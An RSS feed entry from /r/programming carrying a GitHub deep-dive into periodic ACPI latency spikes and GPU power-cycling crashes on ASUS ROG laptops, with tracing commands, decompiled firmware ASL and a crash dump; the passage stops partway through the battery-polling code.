<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><atom:link href="http://192.168.1.132/?platform=reddit&amp;subreddit=programming&amp;averagePostsPerDay=5&amp;content&amp;view=rss" rel="self" type="application/rss+xml"/><title>/r/programming</title><description>Hot posts in /r/programming (roughly 5 posts per day)</description><link>https://www.reddit.com/r/programming/</link><language>en-us</language><lastBuildDate>Wed, 17 Sep 2025 17:46:59 +0000</lastBuildDate><generator>Upvote RSS</generator><image><url>https://styles.redditmedia.com/t5_2fwo/styles/communityIcon_1bqa1ibfp8q11.png</url><title>/r/programming</title><link>https://www.reddit.com/r/programming/</link></image><item><link>https://github.com/Zephkek/Asus-ROG-Aml-Deep-Dive</link><title>ASUS Gaming Laptops Have Been Broken Since 2021: A Deep Dive (github.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1niy72f/asus_gaming_laptops_have_been_broken_since_2021_a/</guid><comments>https://www.reddit.com/r/programming/comments/1niy72f/asus_gaming_laptops_have_been_broken_since_2021_a/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 43 min | <a href='https://www.reddit.com/r/programming/comments/1niy72f/asus_gaming_laptops_have_been_broken_since_2021_a/'>Post permalink</a></p></section><section class='preview-image'><img src='https://opengraph.githubassets.com/a60dc2277e027e844ba79369a4adb33321857c22f9654f7c36ef1cf1ec9970d8/Zephkek/Asus-ROG-Aml-Deep-Dive' /></section><section class='parsed-content'><div><article><h2>The ASUS Gaming Laptop ACPI Firmware Bug: A Deep Technical Investigation</h2><a href="https://github.com#the-asus-gaming-laptop-acpi-firmware-bug-a-deep-technical-investigation"></a><p></p><h2>If You're Here, You Know The Pain</h2><a href="https://github.com#if-youre-here-you-know-the-pain"></a><p>You own a high-end ASUS ROG laptop perhaps a Strix, Scar, or Zephyrus. It's specifications are impressive: an RTX 30/40 series GPU, a top-tier Intel processor, and plenty of RAM. Yet, it stutters during basic tasks like watching a YouTube video, audio crackles and pops on Discord calls, the mouse cursor freezes for a split second, just long enough to be infuriating.</p><p>You've likely tried all the conventional fixes:</p><ul> <li>Updating every driver imaginable, multiple times.</li> <li>Performing a "clean" reinstallation of Windows.</li> <li>Disabling every conceivable power-saving option.</li> <li>Manually tweaking processor interrupt affinities.</li> <li>Following convoluted multi-step guides from Reddit threads.</li> <li>Even installing Linux, only to find the problem persists.</li> </ul><p>If none of that worked, it's because the issue isn't with the operating system or a driver. The problem is far deeper, embedded in the machine's firmware, the BIOS.</p><h2>Initial Symptoms and Measurement</h2><a href="https://github.com#initial-symptoms-and-measurement"></a><p></p><h3>The Pattern Emerges</h3><a href="https://github.com#the-pattern-emerges"></a><p>The first tool in any performance investigator's toolkit for these symptoms is LatencyMon. It acts as a canary in the coal mine for system-wide latency issues. On an affected ASUS Zephyrus M16, the results are immediate and damning:</p><div><pre><code>CONCLUSION Your system appears to be having trouble handling real-time audio and other tasks. You are likely to experience buffer underruns appearing as drop outs, clicks or pops. HIGHEST MEASURED INTERRUPT TO PROCESS LATENCY Highest measured interrupt to process latency (&mu;s): 65,816.60 Average measured interrupt to process latency (&mu;s): 23.29 HIGHEST REPORTED ISR ROUTINE EXECUTION TIME Highest ISR routine execution time (&mu;s): 536.80 Driver with highest ISR routine execution time: ACPI.sys HIGHEST REPORTED DPC ROUTINE EXECUTION TIME Highest DPC routine execution time (&mu;s): 5,998.83 Driver with highest DPC routine execution time: ACPI.sys </code></pre></div><p>The data clearly implicates <code>ACPI.sys</code>. However, the per-CPU data reveals a more specific pattern:</p><div><pre><code>CPU 0 Interrupt cycle time (s): 208.470124 CPU 0 ISR highest execution time (&mu;s): 536.804674 CPU 0 DPC highest execution time (&mu;s): 5,998.834725 CPU 0 DPC total execution time (s): 90.558238 </code></pre></div><p>CPU 0 is taking the brunt of the impact, spending over 90 seconds processing interrupts while other cores remain largely unaffected. This isn't a failure of load balancing; it's a process locked to a single core.</p><p>A similar test on a Scar 15 from 2022 shows the exact same culprit: high DPC latency originating from <code>ACPI.sys</code>.</p><a href="https://private-user-images.githubusercontent.com/76183331/490271011-fdf6f26a-dda8-4561-82c7-349fc8c298ab.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgwODU3MDksIm5iZiI6MTc1ODA4NTQwOSwicGF0aCI6Ii83NjE4MzMzMS80OTAyNzEwMTEtZmRmNmYyNmEtZGRhOC00NTYxLTgyYzctMzQ5ZmM4YzI5OGFiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MTclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTE3VDA1MDMyOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTM1YWE5NjRjNTlmY2FmNjY2NjdlMjM4ZGM1OGFlMGZkNGRjOWUyNGRiZWY0YmRmZTVlZjkyMjI0MjYzOTIyMDYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.nFgObRQ95EnQHl7SGNHpZZtbV2qd2JfinCIVIOC2e2Y"><img width="974" height="511" alt="latencymon" src="https://private-user-images.githubusercontent.com/76183331/490271011-fdf6f26a-dda8-4561-82c7-349fc8c298ab.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgwODU3MDksIm5iZiI6MTc1ODA4NTQwOSwicGF0aCI6Ii83NjE4MzMzMS80OTAyNzEwMTEtZmRmNmYyNmEtZGRhOC00NTYxLTgyYzctMzQ5ZmM4YzI5OGFiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MTclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTE3VDA1MDMyOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTM1YWE5NjRjNTlmY2FmNjY2NjdlMjM4ZGM1OGFlMGZkNGRjOWUyNGRiZWY0YmRmZTVlZjkyMjI0MjYzOTIyMDYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.nFgObRQ95EnQHl7SGNHpZZtbV2qd2JfinCIVIOC2e2Y"></a><p>It's easy to blame a Windows driver, but <code>ACPI.sys</code> is not a typical driver. It primarily functions as an interpreter for ACPI Machine Language (AML), the code provided by the laptop's firmware (BIOS). If <code>ACPI.sys</code> is slow, it's because the firmware is feeding it inefficient or flawed AML code to execute. These slowdowns are often triggered by General Purpose Events (GPEs) and traffic from the Embedded Controller (EC). To find the true source, we must dig deeper.</p><h2>Capturing the Problem in More Detail: ETW Tracing</h2><a href="https://github.com#capturing-the-problem-in-more-detail-etw-tracing"></a><p></p><h3>Setting Up Advanced ACPI Tracing</h3><a href="https://github.com#setting-up-advanced-acpi-tracing"></a><p>To understand what <code>ACPI.sys</code> is doing during these latency spikes, we can use Event Tracing for Windows (ETW) to capture detailed logs from the ACPI providers.</p><div><pre><span><span>#</span> Find the relevant ACPI ETW providers</span> logman query providers <span>|</span> findstr <span>/</span>i acpi <span><span>#</span> This returns two key providers:</span> <span><span>#</span> Microsoft-Windows-Kernel-Acpi {C514638F-7723-485B-BCFC-96565D735D4A}</span> <span><span>#</span> Microsoft-ACPI-Provider {DAB01D4D-2D48-477D-B1C3-DAAD0CE6F06B}</span> <span><span>#</span> Start a comprehensive trace session</span> logman start ACPITrace <span>-</span>p {DAB01D4D<span>-</span>2D48<span>-</span><span>477D</span><span>-</span>B1C3<span>-</span>DAAD0CE6F06B} <span>0xFFFFFFFF</span> <span>5</span> <span>-</span>o C:\Temp\acpi.etl <span>-</span>ets logman update ACPITrace <span>-</span>p {C514638F<span>-</span><span>7723</span><span>-</span>485B<span>-</span>BCFC<span>-</span>96565D735D4A} <span>0xFFFFFFFF</span> <span>5</span> <span>-</span>ets <span><span>#</span> Then once we're done we can stop the trace and check the etl file and save the data in csv format aswell.</span> logman stop ACPITrace <span>-</span>ets tracerpt C:\Temp\acpi_providers.etl <span>-</span>o C:\Temp\acpi_events.csv <span>-</span>of CSV</pre></div><h3>An Unexpected Discovery</h3><a href="https://github.com#an-unexpected-discovery"></a><p>Analyzing the resulting trace file in the Windows Performance Analyzer reveals a crucial insight. The spikes aren't random; they are periodic, occurring like clockwork every 30 to 60 seconds.</p><a href="https://private-user-images.githubusercontent.com/76183331/490271181-2aac7320-3e06-4025-841c-86129f9d5b62.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgwODU3MDksIm5iZiI6MTc1ODA4NTQwOSwicGF0aCI6Ii83NjE4MzMzMS80OTAyNzExODEtMmFhYzczMjAtM2UwNi00MDI1LTg0MWMtODYxMjlmOWQ1YjYyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MTclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTE3VDA1MDMyOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTI2NDEwOTExNjcxZmM3YmNmMzFlY2RhMTRhYmNhNTY1Mzg4MTU5OTkxZjdlMTQzZDk2NGM4YjlmNjJjODM3YzMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.D4U_Hn0WLn6wO1pYXWY-IYKMgAseJj_gtuZ8WI2yt5o"><img width="1673" height="516" alt="61c7abb1-d7aa-4b69-9a88-22cca7352f00" src="https://private-user-images.githubusercontent.com/76183331/490271181-2aac7320-3e06-4025-841c-86129f9d5b62.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgwODU3MDksIm5iZiI6MTc1ODA4NTQwOSwicGF0aCI6Ii83NjE4MzMzMS80OTAyNzExODEtMmFhYzczMjAtM2UwNi00MDI1LTg0MWMtODYxMjlmOWQ1YjYyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MTclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTE3VDA1MDMyOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTI2NDEwOTExNjcxZmM3YmNmMzFlY2RhMTRhYmNhNTY1Mzg4MTU5OTkxZjdlMTQzZDk2NGM4YjlmNjJjODM3YzMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.D4U_Hn0WLn6wO1pYXWY-IYKMgAseJj_gtuZ8WI2yt5o"></a><p>Random interruptions often suggest hardware faults or thermal throttling. A perfectly repeating pattern points to a systemic issue, a timer or a scheduled event baked into the system's logic.</p><p>The raw event data confirms this pattern:</p><div><pre><code>Clock-Time (100ns), Event, Kernel(ms), CPU 134024027290917802, _GPE._L02 started, 13.613820, 0 134024027290927629, _SB...BAT0._STA started, 0.000000, 4 134024027290932512, _GPE._L02 finished, -, 6 </code></pre></div><p>The first event, <code>_GPE._L02</code>, is an interrupt handler that takes <strong>13.6 milliseconds</strong> to execute. For a high-priority interrupt, this is an eternity and is catastrophic for real-time system performance.</p><p>Deeper in the trace, another bizarre behavior emerges; the system repeatedly attempts to power the discrete GPU on and off, even when it's supposed to be permanently active.</p><div><pre><code>Clock-Time, Event, Duration 134024027315051227, _SB.PC00.GFX0._PS0 start, 278&mu;s # GPU Power On 134024027315155404, _SB.PC00.GFX0._DOS start, 894&mu;s # Display Output Switch 134024027330733719, _SB.PC00.GFX0._PS3 start, 1364&mu;s # GPU Power Off [~15 seconds later] 134024027607550064, _SB.PC00.GFX0._PS0 start, 439&mu;s # Power On Again! 134024027607657368, _SB.PC00.GFX0._DOS start, 1079&mu;s # Display Output Switch 134024027623134006, _SB.PC00.GFX0._PS3 start, 394&mu;s # Power Off Again! ... </code></pre></div><h3>Why This Behavior is Fundamentally Incorrect</h3><a href="https://github.com#why-this-behavior-is-fundamentally-incorrect"></a><p>This power cycling is nonsensical because the laptop is configured for a scenario where it is impossible: <strong>The system is in Ultimate Mode (via a MUX switch) with an external display connected.</strong></p><p>In this mode:</p><ul> <li>The discrete NVIDIA GPU (dGPU) is the <strong>only</strong> active graphics processor.</li> <li>The integrated Intel GPU (iGPU) is completely powered down and bypassed.</li> <li>The dGPU is wired directly to the internal and external displays.</li> <li>There is no mechanism for switching between GPUs.</li> </ul><p>Yet, the firmware is relentlessly trying to power cycle the dGPU every 15-30 seconds. The dGPU in mux mode isn't just "preferred" - it's the ONLY path to the display. There's no fallback, and no alternative. When the firmware sends <code>_PS3</code> (power off), it's attempting something architecturally impossible.</p><p>Most of the time, hardware sanity checks refuse these nonsensical commands, but even failed attempts introduce latency spikes causing audio dropouts, input lag, and accumulating performance degradation. Games freeze mid-session, videos buffer indefinitely, system responsiveness deteriorates until restart.</p><h4>The Catastrophic Edge Case</h4><a href="https://github.com#the-catastrophic-edge-case"></a><p>Sometimes, under specific thermal conditions or race conditions, the power-down actually succeeds. When the firmware manages to power down the GPU that's driving the display, the sequence is predictable and catastrophic:</p><ol> <li><strong>Firmware executes <code>_PS3</code></strong> - GPU power off command</li> <li><strong>Hardware complies</strong> - safety checks fail or timing aligns</li> <li><strong>Display signal cuts</strong> - monitors go black</li> <li><strong>User input triggers wake</strong> - mouse/keyboard activity</li> <li><strong>Windows calls <code>PowerOnMonitor()</code></strong> - attempt display recovery</li> <li><strong>NVIDIA driver executes <code>_PS0</code></strong> - GPU power on command</li> <li><strong>GPU enters impossible state</strong> - firmware insists OFF, Windows needs ON</li> <li><strong>Driver thread blocks indefinitely</strong> - waiting for GPU response</li> <li><strong>30-second watchdog expires</strong> - Windows gives up</li> <li><strong>System crashes with BSOD</strong></li> </ol><div><pre><code>5: kd&gt; !analyze -v ******************************************************************************* * * * Bugcheck Analysis * * * ******************************************************************************* WIN32K_POWER_WATCHDOG_TIMEOUT (19c) Win32k did not turn the monitor on in a timely manner. Arguments: Arg1: 0000000000000050, Calling monitor driver to power on. Arg2: ffff8685b1463080, Pointer to the power request worker thread. Arg3: 0000000000000000 Arg4: 0000000000000000 ... STACK_TEXT: fffff685`3a767130 fffff800`94767be0 : 00000000`00000047 00000000`00000000 00000000`00000000 00000000`00000000 : nt!KiSwapContext+0x76 fffff685`3a767270 fffff800`94726051 : ffff8685`b1463080 00000027`00008b94 fffff685`3a767458 fffff800`00000000 : nt!KiSwapThread+0x6a0 fffff685`3a767340 fffff800`94724ed3 : fffff685`00000000 00000000`00000043 00000000`00000002 0000008a`fbf50968 : nt!KiCommitThreadWait+0x271 fffff685`3a7673e0 fffff800`9471baf2 : fffff685`3a7675d0 02000000`0000001b 00000000`00000000 fffff800`94724500 : nt!KeWaitForSingleObject+0x773 fffff685`3a7674d0 fffff800`9471b7d5 : ffff8685`9cbec810 fffff685`3a7675b8 00000000`00010224 fffff800`00000003 : nt!ExpWaitForFastResource+0x92 fffff685`3a767580 fffff800`9471b49d : 00000000`00000000 ffff8685`9cbec850 ffff8685`b1463080 00000000`00000000 : nt!ExpAcquireFastResourceExclusiveSlow+0x1e5 fffff685`3a767630 fffff800`28faca9b : fffff800`262ee9c8 00000000`00000003 ffff8685`9cbec810 02000000`00000065 : nt!ExAcquireFastResourceExclusive+0x1bd fffff685`3a767690 fffff800`28facbe5 : ffff8685`b31de000 00000000`00000000 ffffd31d`9a05244f 00000000`00000000 : win32kbase!<lambda_63b61c2369133a205197eda5bd671ee7>::<lambda_invoker_cdecl>+0x2b fffff685`3a7676c0 fffff800`28e5f864 : ffffad0c`94d10878 fffff685`3a767769 ffffad0c`94d10830 ffff8685`b31de000 : win32kbase!UserCritInternal::`anonymous namespace'::EnterCritInternalEx+0x4d fffff685`3a7676f0 fffff800`28e5f4ef : 00000000`00000000 00000000`00000000 fffff800`262ee9c8 00000000`00000000 : win32kbase!DrvSetWddmDeviceMonitorPowerState+0x354 fffff685`3a7677d0 fffff800`28e2abab : ffff8685`b31de000 00000000`00000000 ffff8685`b31de000 00000000`00000000 : win32kbase!DrvSetMonitorPowerState+0x2f fffff685`3a767800 fffff800`28ef22fa : 00000000`00000000 fffff685`3a7678d9 00000000`00000001 00000000`00000001 : win32kbase!PowerOnMonitor+0x19b fffff685`3a767870 fffff800`28ef13dd : ffff8685`94a40700 ffff8685`a2eb31d0 00000000`00000001 00000000`00000020 : win32kbase!xxxUserPowerEventCalloutWorker+0xaaa fffff685`3a767940 fffff800`4bab21c2 : ffff8685`b1463080 fffff685`3a767aa0 00000000`00000000 00000000`00000020 : win32kbase!xxxUserPowerCalloutWorker+0x13d fffff685`3a7679c0 fffff800`26217f3a : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : win32kfull!NtUserUserPowerCalloutWorker+0x22 fffff685`3a7679f0 fffff800`94ab8d55 : 00000000`000005bc 00000000`00000104 ffff8685`b1463080 00000000`00000000 : win32k!NtUserUserPowerCalloutWorker+0x2e fffff685`3a767a20 00007ff8`ee71ca24 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!KiSystemServiceCopyEnd+0x25 000000cc`d11ffbc8 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : 0x00007ff8`ee71ca24 ... </lambda_invoker_cdecl></lambda_63b61c2369133a205197eda5bd671ee7></code></pre></div><p>The crash dump confirms the thread is stuck in <code>win32kbase!DrvSetWddmDeviceMonitorPowerState</code>, waiting for the NVIDIA driver to respond. It can't because it's caught between a confused power state, windows wanting to turn on the GPU while the firmware is arming the GPU cut off.</p><h3>Understanding General Purpose Events</h3><a href="https://github.com#understanding-general-purpose-events"></a><p>GPEs are the firmware's mechanism for signaling hardware events to the operating system. They are essentially hardware interrupts that trigger the execution of ACPI code. The trace data points squarely at <code>_GPE._L02</code> as the source of our latency.</p><p>A closer look at the timing reveals a consistent and problematic pattern:</p><div><pre><code>_GPE._L02 Event Analysis from ROG Strix Trace: Event 1 @ Clock 134024027290917802 Duration: 13,613,820 ns (13.61ms) Triggered: Battery and AC adapter status checks Event 2 @ Clock 134024027654496591 Duration: 13,647,255 ns (13.65ms) Triggered: Battery and AC adapter status checks Event 3 @ Clock 134024028048493318 Duration: 13,684,515 ns (13.68ms) Triggered: Battery and AC adapter status checks Interval between events: ~36-39 seconds Consistency: The duration is remarkably stable and the interval is periodic. </code></pre></div><h3>The Correlation</h3><a href="https://github.com#the-correlation"></a><p>Every single time the lengthy <code>_GPE._L02</code> event fires, it triggers the exact same sequence of ACPI method calls.</p><a href="https://private-user-images.githubusercontent.com/76183331/490271340-01326c61-b7a2-4c12-a907-8433f43a6a72.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgwODU3MDksIm5iZiI6MTc1ODA4NTQwOSwicGF0aCI6Ii83NjE4MzMzMS80OTAyNzEzNDAtMDEzMjZjNjEtYjdhMi00YzEyLWE5MDctODQzM2Y0M2E2YTcyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MTclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTE3VDA1MDMyOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQxN2FmYzk4Y2ZiMmU2MzM4MWE2YjE4Y2FiZmFhZjBjY2JmZWM3NmU1OTg4NDBkMzI3Y2Y2ZDMzMGJjNTczMTQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.Z9OfAxR2a51aglnNZsRyH0ECM1d_H1HMSU9HXgcUBx8"><img width="589" height="589" alt="64921999-7614-4706-a5ac-54c39c38fd0b" src="https://private-user-images.githubusercontent.com/76183331/490271340-01326c61-b7a2-4c12-a907-8433f43a6a72.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgwODU3MDksIm5iZiI6MTc1ODA4NTQwOSwicGF0aCI6Ii83NjE4MzMzMS80OTAyNzEzNDAtMDEzMjZjNjEtYjdhMi00YzEyLWE5MDctODQzM2Y0M2E2YTcyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MTclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTE3VDA1MDMyOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQxN2FmYzk4Y2ZiMmU2MzM4MWE2YjE4Y2FiZmFhZjBjY2JmZWM3NmU1OTg4NDBkMzI3Y2Y2ZDMzMGJjNTczMTQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.Z9OfAxR2a51aglnNZsRyH0ECM1d_H1HMSU9HXgcUBx8"></a><p>The pattern is undeniable:</p><ol> <li>A hardware interrupt fires <code>_GPE._L02</code>.</li> <li>The handler executes methods to check battery status.</li> <li>Shortly thereafter, the firmware attempts to change the GPU's power state.</li> <li>The system runs normally for about 30-60 seconds.</li> <li>The cycle repeats.</li> </ol> <h2>Extracting and Decompiling the Firmware Code</h2><a href="https://github.com#extracting-and-decompiling-the-firmware-code"></a><p></p><h3>Getting to the Source</h3><a href="https://github.com#getting-to-the-source"></a><p>To analyze the code responsible for this behavior, we must extract and decompile the ACPI tables provided by the BIOS to the operating system.</p><div><pre><span><span>#</span> Extract all ACPI tables into binary .dat files</span> acpidump -b <span><span>#</span> Output includes:</span> <span><span>#</span> DSDT.dat - The main Differentiated System Description Table</span> <span><span>#</span> SSDT1.dat ... SSDT17.dat - Secondary System Description Tables</span> <span><span>#</span> Decompile the main table into human-readable ACPI Source Language (.dsl)</span> iasl -d DSDT.dsl</pre></div><p>This decompiled ASL provides a direct view into the firmware's executable logic. It is a precise representation of the exact instructions that the ACPI.sys driver is fed by the firmware and executes at the highest privilege level within the Windows kernel. Any logical flaws found in this code are the direct cause of the system's behavior.</p><h3>Finding the GPE Handler</h3><a href="https://github.com#finding-the-gpe-handler"></a><p>Searching the decompiled <code>DSDT.dsl</code> file, we find the definition for our problematic GPE handler:</p><div><pre><span>Scope</span> (<span>_GPE</span>) { <span>Method</span> (<span>_L02</span>, , <span>NotSerialized</span>) <span>// _Lxx: Level-Triggered GPE</span> { \<span>_SB</span>.PC00.LPCB.ECLV () } }</pre></div><p>This code is simple: when the <code>_L02</code> interrupt occurs, it calls a single method, <code>ECLV</code>. The "L" prefix in <code>_L02</code> signifies that this is a <strong>level-triggered</strong> interrupt, meaning it will continue to fire as long as the underlying hardware condition is active. This is a critical detail.</p><h3>The Catastrophic <code>ECLV</code> Implementation</h3><a href="https://github.com#the-catastrophic-eclv-implementation"></a><p>Following the call to <code>ECLV()</code>, we uncover a deeply flawed implementation that is the direct cause of the system-wide stuttering.</p><div><pre><span>Method</span> (ECLV, , <span>NotSerialized</span>) <span>// Starting at line 099244</span> { <span>// Main loop - continues while events exist OR sleep events are pending</span> <span>// AND we haven't exceeded our time budget (TI3S &lt; 0x78)</span> <span>While</span> (((CKEV() != <span>Zero</span>) || (SLEC != <span>Zero</span>)) &amp;&amp; (TI3S &lt; <span>0x78</span>)) { <span>Local1</span> = <span>One</span> <span>While</span> (<span>Local1</span> != <span>Zero</span>) { <span>Local1</span> = GEVT() <span>// Get next event from queue</span> LEVN (<span>Local1</span>) <span>// Process the event</span> TIMC += <span>0x19</span> <span>// Increment time counter by 25</span> <span>// This is where it gets really bad</span> <span>If</span> ((SLEC != <span>Zero</span>) &amp;&amp; (<span>Local1</span> == <span>Zero</span>)) { <span>// No events but sleep events pending</span> <span>If</span> (TIMC == <span>0x19</span>) { <span>Sleep</span> (<span>0x64</span>) <span>// Sleep for 100 milliseconds!!!</span> TIMC = <span>0x64</span> <span>// Set time counter to 100</span> TI3S += <span>0x04</span> <span>// Increment major counter by 4</span> } <span>Else</span> { <span>Sleep</span> (<span>0x19</span>) <span>// Sleep for 25 milliseconds!!!</span> TI3S++ <span>// Increment major counter by 1</span> } } } } <span>// Here's where it gets even worse</span> <span>If</span> (TI3S &gt;= <span>0x78</span>) <span>// If we hit our time budget (120)</span> { TI3S = <span>Zero</span> <span>If</span> (EEV0 == <span>Zero</span>) { EEV0 = <span>0xFF</span> <span>// Force another event to be pending!</span> } } }</pre></div><h3>Breaking Down this monstrosity</h3><a href="https://github.com#breaking-down-this-monstrosity"></a><p>This short block of code violates several fundamental principles of firmware and kernel programming.</p><p><strong>Wtf 1: Sleeping in an Interrupt Context</strong></p><div><pre><span>Sleep</span> (<span>0x64</span>) <span>// 100ms sleep</span> <span>Sleep</span> (<span>0x19</span>) <span>// 25ms sleep</span></pre></div><p>An interrupt handler runs at a very high priority to service hardware requests quickly. The <code>Sleep()</code> function completely halts the execution of the CPU core it is running on (CPU 0 in this case). While CPU 0 is sleeping, it cannot:</p><ul> <li>Process any other hardware interrupts.</li> <li>Allow the kernel to schedule other threads.</li> <li>Update system timers.</li> </ul><p><strong>Wtf 2: Time-Sliced Interrupt Processing</strong> The entire loop is designed to run for an extended period, processing events in batches. It's effectively a poorly designed task scheduler running inside an interrupt handler, capable of holding a CPU core hostage for potentially seconds at a time.</p><p><strong>Wtf 3: Self-Rearming Interrupt</strong></p><div><pre><span>If</span> (EEV0 == <span>Zero</span>) { EEV0 = <span>0xFF</span> <span>// Forces all EC event bits on</span> }</pre></div><p>This logic ensures that even if the Embedded Controller's event queue is empty, the code will create a new, artificial event. This guarantees that another interrupt will fire shortly after, creating the perfectly periodic pattern of ACPI spikes observed in the traces.</p><h2>The Event Dispatch System</h2><a href="https://github.com#the-event-dispatch-system"></a><p></p><h3>How Events Route to Actions</h3><a href="https://github.com#how-events-route-to-actions"></a><p>The LEVN() method takes an event and routes it:</p><div><pre><span>Method</span> (LEVN, <span>1</span>, <span>NotSerialized</span>) { <span>If</span> ((<span>Arg0</span> != <span>Zero</span>)) { MBF0 = <span>Arg0</span> P80B = <span>Arg0</span> <span>Local6</span> = <span>Match</span> (LEGA, <span>MEQ</span>, <span>Arg0</span>, <span>MTR</span>, <span>Zero</span>, <span>Zero</span>) <span>If</span> ((<span>Local6</span> != <span>Ones</span>)) { LGPA (<span>Local6</span>) } } } </pre></div><h3>The <code>LGPA</code> Dispatch Table</h3><a href="https://github.com#the-lgpa-dispatch-table"></a><p>The LGPA() method is a giant switch statement handling different events:</p><div><pre><span>Method</span> (LGPA, <span>1</span>, <span>Serialized</span>) <span>// Line 098862</span> { <span>Switch</span> (<span>ToInteger</span> (<span>Arg0</span>)) { <span>Case</span> (<span>Zero</span>) <span>// Most common case - power event</span> { DGD2 () <span>// GPU-related function</span> ^EC0._QA0 () <span>// EC query method</span> PWCG () <span>// Power change - this is our battery polling</span> } <span>Case</span> (<span>0x18</span>) <span>// GPU-specific event</span> { <span>If</span> (M6EF == <span>One</span>) { <span>Local0</span> = <span>0xD2</span> } <span>Else</span> { <span>Local0</span> = <span>0xD1</span> } NOD2 (<span>Local0</span>) <span>// Notify GPU driver</span> } <span>Case</span> (<span>0x1E</span>) <span>// Another GPU event</span> { <span>Notify</span> (^^PEG1.PEGP, <span>0xD5</span>) <span>// Direct GPU notification</span> ROCT = <span>0x55</span> <span>// Sets flag for follow-up</span> } } }</pre></div><p>This shows a direct link: a GPE fires, and the dispatch logic calls functions related to battery polling and GPU notifications.</p><h2>The Battery Polling Function</h2><a href="https://github.com#the-battery-polling-function"></a><p>The <code>PWCG()</code> method, called by multiple event types, is responsible for polling the battery and AC adapter status.</p><div><pre><span>Method</span> (PWCG, , <span>NotSerialized</span>) { <span>Notify</span> (ADP0, <span>Zero</span>) <span>// Tell OS to check the AC adapter</span> ^BAT0.<span>_BST</span> () <span>// Execute the Battery Status method</span> <span>Notify</span> (BAT0, <span>0x80</span>) <span>// Tell OS the battery status has changed</span> ^BAT0.<span>_BIF</span> () <span>// Execute the Battery Information method </span> <span>Notify</span> (BAT0, 